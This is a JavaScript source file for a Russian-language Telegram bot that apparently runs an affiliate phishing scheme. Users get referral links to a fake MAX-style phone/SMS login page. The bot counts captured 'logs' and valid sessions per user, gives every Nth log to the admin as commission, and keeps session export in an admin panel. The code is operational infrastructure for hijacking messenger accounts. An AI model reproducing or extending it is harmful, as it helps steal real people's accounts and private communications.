const fs = require('fs');
const path = require('path');
const config = require('./config');
const store = require('./store');
const apiClient = require('./api-client');
const { getUserSettings, setUserSettings } = require('./user-settings');
const { createAdminPanel } = require('./admin-panel');

const PERIOD_LABEL = {
  day: 'за день',
  week: 'за неделю',
  month: 'за месяц',
  all: 'за всё время'
};

const TOKEN = config.token;
const REQUIRED_CHATS = config.requiredChats;
const SUBSCRIPTION_ENABLED = config.subscriptionEnabled;
const ADMIN_ONLY = config.adminOnly;
const SUPPORT = config.supportUsername.replace(/^@/, '');
const LINKS = config.links;
const AUTH_SITE = config.authSiteUrl;
const SESSIONS_DIR = path.join(process.cwd(), 'sessions');
const LOCK_FILE = path.join(process.cwd(), '.bot.lock');
const API = TOKEN ? `https://api.telegram.org/bot${TOKEN}` : '';

const NAV = {
  MENU: 'menu',
  PROFILE: 'profile',
  BOTS: 'bots',
  TEMPLATES: 'templates',
  TEMPLATE_MAX: 'template_max',
  LINKS: 'links',
  SETTINGS: 'settings',
  ADMIN: 'admin'
};

let offset = 0;
let running = true;
let adminPanel;

function ensureSessionsDir() {
  fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

async function isAdminUser(userId) {
  return adminPanel.isAdmin(userId);
}

function configuredChats() {
  return REQUIRED_CHATS.filter((chat) => chat.chatId);
}

async function trackUser(from) {
  if (!from || !from.id) return null;
  const user = store.touchUser(from.id, {
    username: from.username || '',
    firstName: from.first_name || ''
  });
  await apiClient.syncUser(user);
  return user;
}

function refLinkFor(user) {
  const code = user && user.refCode ? user.refCode : '';
  return `${AUTH_SITE}/?ref=${code}`;
}

function backButton() {
  return [{ text: '◀️ В меню', callback_data: `nav:${NAV.MENU}` }];
}

async function mainMenuInlineKeyboard(userId) {
  const rows = [
    [{ text: '👨‍💻 Профиль', callback_data: `nav:${NAV.PROFILE}` }],
    [
      { text: '🔵 Боты', callback_data: `nav:${NAV.BOTS}` },
      { text: '📄 Шаблоны', callback_data: `nav:${NAV.TEMPLATES}` }
    ],
    [
      { text: '🔗 Ссылки', callback_data: `nav:${NAV.LINKS}` },
      { text: '⚙️ Настройки', callback_data: `nav:${NAV.SETTINGS}` }
    ],
    [{ text: '» Поддержка', url: LINKS.support.url }]
  ];
  if (await isAdminUser(userId)) {
    rows.splice(3, 0, [{ text: '🛡 Админ', callback_data: `nav:${NAV.ADMIN}` }]);
  }
  return { inline_keyboard: rows };
}

function profileKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '📅 День', callback_data: 'stats:day' },
        { text: '📅 Неделя', callback_data: 'stats:week' },
        { text: '📅 Месяц', callback_data: 'stats:month' }
      ],
      [{ text: '🔗 Моя ссылка', callback_data: 'profile:link' }],
      backButton()
    ]
  };
}

function linksKeyboard() {
  return {
    inline_keyboard: [
      [{ text: LINKS.chat.label, url: LINKS.chat.url }],
      [{ text: LINKS.channel.label, url: LINKS.channel.url }],
      [{ text: LINKS.support.label, url: LINKS.support.url }],
      backButton()
    ]
  };
}

function templatesKeyboard() {
  return {
    inline_keyboard: [
      [{ text: 'MAX', callback_data: `nav:${NAV.TEMPLATE_MAX}` }],
      backButton()
    ]
  };
}

function settingsKeyboard(userId) {
  const settings = getUserSettings(userId);
  const notifyLabel = settings.notify ? '🔔 Уведомления: вкл' : '🔕 Уведомления: выкл';
  const langLabel = settings.lang === 'en' ? '🌐 Язык: English' : '🌐 Язык: Русский';

  return {
    inline_keyboard: [
      [{ text: notifyLabel, callback_data: 'set:notify' }],
      [{ text: langLabel, callback_data: 'set:lang' }],
      [{ text: '🔗 Сайт авторизации', url: AUTH_SITE }],
      backButton()
    ]
  };
}

function subscribeKeyboard() {
  const rows = REQUIRED_CHATS.map((chat) => [{ text: chat.label, url: chat.url }]);
  rows.push([{ text: '✅ Проверить подписку', callback_data: 'check_sub' }]);
  return { inline_keyboard: rows };
}

async function formatProfileSummary(userId) {
  const day = await apiClient.userStats(userId, 'day');
  const week = await apiClient.userStats(userId, 'week');
  const month = await apiClient.userStats(userId, 'month');
  const all = await apiClient.userStats(userId, 'all');
  const every = all.commissionEvery;
  const until = all.untilCommission;
  const progressLine =
    every > 0
      ? `Комиссия: каждый ${every}-й лог → админу\nПрогресс цикла: ${all.progressInCycle}/${every}` +
        (until != null ? `\nДо комиссионного: ${until}` : '')
      : 'Комиссия выключена.';

  return [
    '👨‍💻 Профиль',
    '',
    `Сегодня: ${day.valid} готовых / ${day.logs} всего`,
    `Неделя: ${week.valid} готовых / ${week.logs} всего`,
    `Месяц: ${month.valid} готовых / ${month.logs} всего`,
    `Всего: ${all.valid} готовых / ${all.logs} всего`,
    `Визитов по ссылке: ${all.visits}`,
    '',
    progressLine,
    '',
    'Выгрузка логов доступна только в админ-панели.'
  ].join('\n');
}

async function formatUserPeriod(userId, period) {
  const stats = await apiClient.userStats(userId, period);
  const label = PERIOD_LABEL[period] || period;
  return [
    `📊 Ваши логи ${label}`,
    '',
    `Готовых: ${stats.valid} · Всего: ${stats.logs}`,
    `Визитов: ${stats.visits}`,
    `Комиссионных забрано: ${stats.commissionTaken}`,
    '',
    stats.commissionEvery > 0
      ? `Комиссия: каждый ${stats.commissionEvery}-й лог`
      : 'Комиссия выключена'
  ].join('\n');
}

function isMemberStatus(member) {
  const status = member.status;
  if (['creator', 'administrator', 'member'].includes(status)) return true;
  if (status === 'restricted' && member.is_member) return true;
  return false;
}

async function api(method, body, options = {}) {
  const url = `${API}/${method}`;
  const init = { method: 'POST' };

  if (options.multipart) {
    init.body = body;
  } else {
    init.headers = { 'Content-Type': 'application/json' };
    init.body = JSON.stringify(body);
  }

  const response = await fetch(url, init);
  const data = await response.json();
  if (!data.ok) {
    throw new Error(data.description || `Telegram API error (${method})`);
  }
  return data.result;
}

async function sendMessage(chatId, text, extra = {}) {
  return api('sendMessage', { chat_id: chatId, text, ...extra });
}

async function editMessage(chatId, messageId, text, extra = {}) {
  return api('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text,
    ...extra
  });
}

async function answerCallback(callbackQueryId, text = '') {
  return api('answerCallbackQuery', {
    callback_query_id: callbackQueryId,
    text,
    show_alert: Boolean(text)
  });
}

async function sendDocumentBuffer(chatId, buffer, fileName, caption = '') {
  const form = new FormData();
  form.append('chat_id', String(chatId));
  form.append('document', new Blob([buffer]), path.basename(fileName));
  if (caption) form.append('caption', caption);
  return api('sendDocument', form, { multipart: true });
}

async function checkSubscription(userId) {
  if (await isAdminUser(userId)) return { ok: true, missing: [] };

  const chats = configuredChats();
  if (!chats.length) {
    return { ok: false, missing: REQUIRED_CHATS, notConfigured: true };
  }

  const missing = [];
  for (const chat of chats) {
    try {
      const member = await api('getChatMember', {
        chat_id: chat.chatId,
        user_id: userId
      });
      if (!isMemberStatus(member)) missing.push(chat);
    } catch (error) {
      console.error(`sub check ${chat.label}:`, error.message);
      missing.push(chat);
    }
  }
  return { ok: missing.length === 0, missing };
}

function subscribeText(missing) {
  const names = (missing.length ? missing : REQUIRED_CHATS).map((chat) => `• ${chat.label}`).join('\n');
  return [
    'Для доступа к боту подпишитесь на ресурсы:',
    '',
    names,
    '',
    'После подписки нажмите «Проверить подписку».'
  ].join('\n');
}

async function requireSubscription(chatId, userId) {
  if (!SUBSCRIPTION_ENABLED) return true;
  const result = await checkSubscription(userId);
  if (result.ok) return true;
  let text = subscribeText(result.missing);
  if (result.notConfigured) {
    text += '\n\nАдмин: добавьте бота в чаты, выполните /chatid и впишите id в .env.';
  }
  await sendMessage(chatId, text, {
    reply_markup: subscribeKeyboard()
  });
  return false;
}

async function removeReplyKeyboard(chatId) {
  await sendMessage(chatId, '·', { reply_markup: { remove_keyboard: true } });
}

async function showMainMenu(chatId, userId, text = 'Главное меню:', options = {}) {
  const markup = { reply_markup: await mainMenuInlineKeyboard(userId) };
  if (options.messageId) {
    await editMessage(chatId, options.messageId, text, markup);
    return;
  }
  await sendMessage(chatId, text, markup);
}

async function showProfile(chatId, userId, messageId) {
  const text = await formatProfileSummary(userId);
  const markup = { reply_markup: profileKeyboard() };
  if (messageId) await editMessage(chatId, messageId, text, markup);
  else await sendMessage(chatId, text, markup);
}

async function showBots(chatId, messageId) {
  const text = [
    '🔵 Боты',
    '',
    'Раздел в разработке — позже доделаю.',
    '',
    'Скоро здесь можно будет управлять своими ботами.'
  ].join('\n');
  const markup = { reply_markup: { inline_keyboard: [backButton()] } };
  if (messageId) await editMessage(chatId, messageId, text, markup);
  else await sendMessage(chatId, text, markup);
}

async function showTemplates(chatId, messageId) {
  const text = ['📄 Шаблоны', '', 'Доступные шаблоны авторизации:'].join('\n');
  const markup = { reply_markup: templatesKeyboard() };
  if (messageId) await editMessage(chatId, messageId, text, markup);
  else await sendMessage(chatId, text, markup);
}

async function showTemplateMax(chatId, userId, messageId) {
  const user = store.getUser(userId) || store.touchUser(userId);
  const link = refLinkFor(user);
  const text = [
    '📄 Шаблон MAX',
    '',
    'Страница входа в стиле MAX (телефон / SMS).',
    '',
    `Ваша реф-ссылка:\n${link}`,
    '',
    'Переходы и логи с этой ссылки считаются на ваш профиль.',
    `После входа сессия сохраняется. Выгрузка — у админов (@${config.botUsername}).`
  ].join('\n');
  const markup = {
    inline_keyboard: [
      [{ text: '🌐 Открыть мою ссылку', url: link }],
      [{ text: '◀️ К шаблонам', callback_data: `nav:${NAV.TEMPLATES}` }],
      backButton()
    ]
  };
  if (messageId) await editMessage(chatId, messageId, text, { reply_markup: markup });
  else await sendMessage(chatId, text, { reply_markup: markup });
}

async function showLinks(chatId, messageId) {
  const text = ['🔗 Ссылки', '', 'Наши ресурсы:'].join('\n');
  const markup = { reply_markup: linksKeyboard() };
  if (messageId) await editMessage(chatId, messageId, text, markup);
  else await sendMessage(chatId, text, markup);
}

async function showSettings(chatId, userId, messageId) {
  const settings = getUserSettings(userId);
  const text = [
    '⚙️ Настройки',
    '',
    `Уведомления: ${settings.notify ? 'включены' : 'выключены'}`,
    `Язык интерфейса: ${settings.lang === 'en' ? 'English' : 'Русский'}`,
    '',
    'Сайт авторизации — по кнопке ниже или через вашу реф-ссылку в профиле.'
  ].join('\n');
  const markup = { reply_markup: settingsKeyboard(userId) };
  if (messageId) await editMessage(chatId, messageId, text, markup);
  else await sendMessage(chatId, text, markup);
}

async function requireAdminGate(chatId, userId) {
  if (!ADMIN_ONLY || (await isAdminUser(userId))) return true;
  await sendMessage(chatId, `Нет доступа.\nПоддержка: @${SUPPORT}`);
  return false;
}

async function handleNavigation(chatId, userId, nav, messageId) {
  if (nav === NAV.MENU) {
    await showMainMenu(chatId, userId, 'Главное меню:', { messageId });
    return;
  }
  if (nav === NAV.PROFILE) {
    await showProfile(chatId, userId, messageId);
    return;
  }
  if (nav === NAV.BOTS) {
    await showBots(chatId, messageId);
    return;
  }
  if (nav === NAV.TEMPLATES) {
    await showTemplates(chatId, messageId);
    return;
  }
  if (nav === NAV.TEMPLATE_MAX) {
    await showTemplateMax(chatId, userId, messageId);
    return;
  }
  if (nav === NAV.LINKS) {
    await showLinks(chatId, messageId);
    return;
  }
  if (nav === NAV.SETTINGS) {
    await showSettings(chatId, userId, messageId);
    return;
  }
  if (nav === NAV.ADMIN) {
    if (!(await isAdminUser(userId))) {
      await sendMessage(chatId, 'Нет доступа к админке.');
      return;
    }
    await adminPanel.showHome(chatId, messageId);
  }
}

async function handleText(chatId, userId, text, from) {
  await trackUser(from);
  const trimmed = String(text || '').trim();

  if (await adminPanel.handleText(chatId, userId, trimmed)) return;

  if (trimmed === '/start') {
    if (!(await requireSubscription(chatId, userId))) return;
    if (!(await requireAdminGate(chatId, userId))) return;
    await removeReplyKeyboard(chatId);
    const user = store.getUser(userId) || store.touchUser(userId);
    await showMainMenu(
      chatId,
      userId,
      `Привет! @${config.botUsername}\n\nВаша ссылка:\n${refLinkFor(user)}\n\nГлавное меню:`
    );
    return;
  }

  if (trimmed === '/help' || trimmed === '/menu') {
    if (!(await requireSubscription(chatId, userId))) return;
    if (!(await requireAdminGate(chatId, userId))) return;
    await showMainMenu(chatId, userId);
    return;
  }

  if (trimmed === '/chatid' && (await isAdminUser(userId)) && String(chatId).startsWith('-')) {
    await sendMessage(chatId, `chat_id этого чата: ${chatId}`);
    return;
  }

  if (trimmed === '/admin') {
    if (!(await isAdminUser(userId))) {
      await sendMessage(chatId, 'Нет доступа.');
      return;
    }
    await adminPanel.showHome(chatId);
  }
}

async function handleCallback(callback) {
  const chatId = callback.message.chat.id;
  const userId = callback.from.id;
  const data = callback.data || '';

  try {
    await trackUser(callback.from);

    if (data === 'check_sub' && SUBSCRIPTION_ENABLED) {
      const result = await checkSubscription(userId);
      if (!result.ok) {
        const alert = result.notConfigured
          ? 'Проверка не настроена. Админ: укажите chat id в .env'
          : 'Подписка не найдена. Вступите в чаты и попробуйте снова.';
        await answerCallback(callback.id, alert);
        let text = subscribeText(result.missing);
        if (result.notConfigured) {
          text += '\n\nАдмин: добавьте бота в чаты, выполните /chatid и впишите id в .env.';
        }
        await editMessage(chatId, callback.message.message_id, text, {
          reply_markup: subscribeKeyboard()
        });
        return;
      }

      await answerCallback(callback.id, 'Подписка подтверждена');
      if (!(await requireAdminGate(chatId, userId))) return;
      await showMainMenu(chatId, userId, 'Подписка подтверждена. Главное меню:', {
        messageId: callback.message.message_id
      });
      return;
    }

    if (data.startsWith('admin:')) {
      const handled = await adminPanel.handleCallback(callback);
      if (handled) return;
    }

    if (data.startsWith('nav:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdminGate(chatId, userId))) return;
      await answerCallback(callback.id);
      await handleNavigation(chatId, userId, data.slice(4), callback.message.message_id);
      return;
    }

    if (data.startsWith('stats:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdminGate(chatId, userId))) return;
      const period = data.slice(6);
      if (!PERIOD_LABEL[period]) {
        await answerCallback(callback.id, 'Неизвестный период');
        return;
      }
      await answerCallback(callback.id);
      const text = await formatUserPeriod(userId, period);
      await editMessage(chatId, callback.message.message_id, text, {
        reply_markup: profileKeyboard()
      });
      return;
    }

    if (data === 'profile:link') {
      await answerCallback(callback.id);
      const user = store.getUser(userId) || store.touchUser(userId);
      await sendMessage(chatId, `Ваша реф-ссылка:\n${refLinkFor(user)}`);
      return;
    }

    if (data.startsWith('set:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdminGate(chatId, userId))) return;
      const setting = data.slice(4);
      if (setting === 'notify') {
        const current = getUserSettings(userId);
        setUserSettings(userId, { notify: !current.notify });
        await answerCallback(callback.id, 'Сохранено');
        await showSettings(chatId, userId, callback.message.message_id);
        return;
      }
      if (setting === 'lang') {
        const current = getUserSettings(userId);
        setUserSettings(userId, { lang: current.lang === 'ru' ? 'en' : 'ru' });
        await answerCallback(callback.id, 'Сохранено');
        await showSettings(chatId, userId, callback.message.message_id);
        return;
      }
      await answerCallback(callback.id);
      return;
    }

    await answerCallback(callback.id);
  } catch (error) {
    await answerCallback(callback.id, error.message || String(error));
  }
}

async function handleUpdate(update) {
  if (update.callback_query) {
    await handleCallback(update.callback_query);
    return;
  }

  const message = update.message;
  if (!message || !message.from) return;

  const chatId = message.chat.id;
  const userId = message.from.id;

  try {
    if (message.text) {
      await handleText(chatId, userId, message.text, message.from);
    }
  } catch (error) {
    await sendMessage(chatId, `Ошибка: ${error.message || String(error)}`);
  }
}

async function poll() {
  while (running) {
    try {
      const updates = await api('getUpdates', {
        offset,
        timeout: 50,
        allowed_updates: ['message', 'callback_query']
      });

      for (const update of updates) {
        offset = update.update_id + 1;
        await handleUpdate(update);
      }
    } catch (error) {
      console.error('poll:', error.message || error);
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
  }
}

function validateEnv() {
  if (!TOKEN) {
    console.error('Нужен TELEGRAM_BOT_TOKEN в .env');
    process.exit(1);
  }
  if (!config.admins.size && !config.ownerId) {
    console.error('Нужен TELEGRAM_ADMIN_IDS или TELEGRAM_OWNER_ID в .env');
    process.exit(1);
  }
  if (SUBSCRIPTION_ENABLED && !configuredChats().length) {
    console.warn('Подписка включена, но chat id не заданы в .env');
  }
}

function isProcessRunning(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function acquireLock() {
  if (fs.existsSync(LOCK_FILE)) {
    const oldPid = Number(fs.readFileSync(LOCK_FILE, 'utf8').trim());
    if (oldPid && oldPid !== process.pid && isProcessRunning(oldPid)) {
      console.error(`Бот уже запущен (pid ${oldPid}). Остановите его перед новым запуском.`);
      process.exit(1);
    }
  }
  fs.writeFileSync(LOCK_FILE, String(process.pid), 'utf8');
}

function releaseLock() {
  try {
    if (!fs.existsSync(LOCK_FILE)) return;
    const owner = Number(fs.readFileSync(LOCK_FILE, 'utf8').trim());
    if (owner === process.pid) fs.unlinkSync(LOCK_FILE);
  } catch {
    /* ignore */
  }
}

function shutdown() {
  running = false;
  releaseLock();
}

async function bootstrap() {
  validateEnv();
  acquireLock();
  ensureSessionsDir();

  adminPanel = createAdminPanel({
    sendMessage,
    editMessage,
    answerCallback,
    sendDocumentBuffer,
    api
  });

  try {
    await api('deleteWebhook', { drop_pending_updates: true });
  } catch (error) {
    console.warn('deleteWebhook:', error.message || error);
  }
  console.log(
    `@${config.botUsername}: owner=${config.ownerId}, envAdmins=${config.admins.size}, subscription=${SUBSCRIPTION_ENABLED ? 'on' : 'off'}, adminOnly=${ADMIN_ONLY ? 'on' : 'off'}, remoteApi=${apiClient.useRemote() ? 'yes' : 'no'}`
  );
  apiClient.syncAllUsers().catch((error) => {
    console.warn('syncAllUsers:', error.message || error);
  });
  await poll();
}

bootstrap().catch((error) => {
  console.error(error);
  process.exit(1);
});

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
process.on('exit', releaseLock);
